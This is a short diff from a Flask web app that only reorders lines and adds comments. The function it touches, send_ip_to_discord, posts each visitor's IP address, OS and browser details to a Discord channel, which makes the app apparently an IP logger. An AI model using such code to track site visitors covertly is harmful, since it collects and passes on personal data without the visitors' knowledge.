@@ -13,12 +13,12 @@ DISCORD_CHANNEL_ID = os.getenv("DISCORD_CHANNEL_ID")
 OUTSIDE_PORT = os.getenv("OUTSIDE_PORT")
 ABSTRACT_API_KEY = os.getenv("ABSTRACT_API_KEY")
 
-app = Flask(__name__)
-
-# Replace with your actual Discord bot token and channel ID
 DISCORD_BOT_TOKEN = API_KEY
 DISCORD_CHANNEL_ID = DISCORD_CHANNEL_ID
 
+app = Flask(__name__)
+
+# Function to send IP data to Discord
 def send_ip_to_discord(ip, data, user_agent_raw, method):
     url = f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages"
     headers = {
@@ -35,6 +35,7 @@ def send_ip_to_discord(ip, data, user_agent_raw, method):
     os_info = f"{ua.os.family} {ua.os.version_string}"
     browser_info = f"{ua.browser.family} {ua.browser.version_string}"
 
+    #setup the embed message
     embed = {
         "title": "New Visitor",
         "description": f"IP Address: `{ip}`",
